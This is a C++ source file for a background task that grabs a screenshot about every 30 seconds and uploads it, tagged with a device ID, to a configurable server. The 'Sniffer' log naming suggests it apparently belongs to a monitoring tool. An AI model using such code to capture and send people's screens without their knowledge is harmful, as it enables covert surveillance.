/*
 * RequestScreenCapUpdateTask.cpp
 *
 *  Created on: 2015-9-10
 *      Author: Max
 */

#include "RequestScreenCapUpdateTask.h"

/*
 * 处理线程
 */
class ScreenCapRunnable : public KRunnable {
public:
	ScreenCapRunnable(RequestScreenCapUpdateTask *pRequestScreenCapUpdateTask) {
		mpRequestScreenCapUpdateTask = pRequestScreenCapUpdateTask;
	}
	virtual ~ScreenCapRunnable() {
		mpRequestScreenCapUpdateTask = NULL;
	}
protected:
	void onRun() {
		if( mpRequestScreenCapUpdateTask != NULL ) {
			mpRequestScreenCapUpdateTask->HandleScreenCapRunnable();
		}
	}
private:
	RequestScreenCapUpdateTask *mpRequestScreenCapUpdateTask;
};

RequestScreenCapUpdateTask::RequestScreenCapUpdateTask() {
	// TODO Auto-generated constructor stub
	mpCallback = NULL;

	mbFinishOK = false;
	mErrCode = "";

	mDeviceId = "";
	mServer = "";
	mPath = "";

	mpScreenCapRunnable = new ScreenCapRunnable(this);
	mHttpRequest.SetCallback(this);
}

RequestScreenCapUpdateTask::~RequestScreenCapUpdateTask() {
	// TODO Auto-generated destructor stub

	if( mpScreenCapRunnable != NULL ) {
		delete mpScreenCapRunnable;
	}
}

void RequestScreenCapUpdateTask::SetCallback(IRequestScreenCapUpdateCallback* pCallback) {
	mpCallback = pCallback;
}

bool RequestScreenCapUpdateTask::Start() {
	bool bFlag = false;

	if( BaseTask::Start() ) {
		if( mThread.start(mpScreenCapRunnable) != -1 ) {
			bIsRunning = true;
			bFlag = true;
		} else {
			OnTaskFinish();
		}
	}

	FileLog(
			SnifferLogFileName,
			"RequestScreenCapUpdateTask::Start( "
			"bFlag : %s "
			")",
			bFlag?"true":"false"
			);

	return bFlag;
}

void RequestScreenCapUpdateTask::Stop() {
	bIsRunning = false;
	mHttpRequest.StopRequest(false);
	mThread.stop();
	BaseTask::Stop();
	BaseTask::Reset();
}

bool RequestScreenCapUpdateTask::IsFinishOK() {
	return mbFinishOK;
}

const char* RequestScreenCapUpdateTask::GetErrCode() {
	return mErrCode.c_str();
}

void RequestScreenCapUpdateTask::SetParam(
		const string& deviceId,
		const string& server,
		const string& path
		) {
	mDeviceId = deviceId;
	mServer = server;
	mPath = path;
}

void RequestScreenCapUpdateTask::HandleScreenCapRunnable() {
	FileLog(
			SnifferLogFileName,
			"RequestScreenCapUpdateTask::HandleScreenCapRunnable( "
			"bIsRunning : %s"
			" )",
			bIsRunning?"true":"false"
			);

	int iCount = 30;
	while( bIsRunning ) {
		if( iCount % 30 == 0 ) {
			FileLog(
					SnifferLogFileName,
					"RequestScreenCapUpdateTask::HandleScreenCapRunnable( "
					"mpCallback : %p"
					" )",
					mpCallback
					);
			if( mpCallback != NULL ) {
				string filePath = "";
				if( mpCallback->OnGetScreenCap(filePath, this) && filePath.length() > 0 ) {
					HttpEntiy httpEntiy;
					httpEntiy.Reset();
					httpEntiy.SetSaveCookie(false);

					if( mDeviceId.length() > 0 ) {
						httpEntiy.AddContent(DEVICE_ID_LOWER, mDeviceId);
					}

					if( filePath.length() > 0 ) {
						// 文件
						httpEntiy.AddFile(UPLOAD_FILE_LOWER, filePath, "image/jpg");

						// 目录名
						string dir;
						string::size_type pos = filePath.find_last_of("/");
						if( pos != string::npos ) {
							dir = filePath.substr(0, pos + 1);
							if( dir.length() > 0 ) {
								httpEntiy.AddContent(UPLOAD_DIR_LOWER, dir);
							}
						}

						long request = mHttpRequest.StartRequest(mServer, mPath, httpEntiy);
						if( HTTPREQUEST_INVALIDREQUESTID != request ) {
							mCond.wait();
						}
					}
				}
			}
		}

		++iCount %= 30;

		sleep(1);
	}

}

void RequestScreenCapUpdateTask::onSuccess(long requestId, string url, const char* buf, int size) {
	Json::Value root;
	Json::Reader reader;
	bool bFlag = false;

	string uploadUrl = "";
	if( reader.parse(buf, root, false) ) {
		if( root.isObject() ) {
			if( root[COMMON_RESULT].isInt() && root[COMMON_RESULT].asInt() == 1 ) {
				Json::Value dataJson = root[COMMON_DATA];
				if( dataJson[FILEPATH_LOWER].isString() ) {
					string filePath = dataJson[FILEPATH_LOWER].asString();
					uploadUrl = mServer;
					uploadUrl += filePath;
					bFlag = true;
				}

			} else {
				bFlag = false;
			}
		}
	}

	if( mpCallback != NULL ) {
		mpCallback->OnUploadScreenCap(bFlag, uploadUrl, this);
	}

	mCond.signal();
}

void RequestScreenCapUpdateTask::onFail(long requestId, string url) {
	if( mpCallback != NULL ) {
		mpCallback->OnUploadScreenCap(false, "", this);
	}

	mCond.signal();
}

void RequestScreenCapUpdateTask::onReceiveBody(long requestId, string url, const char* buf, int size) {

}
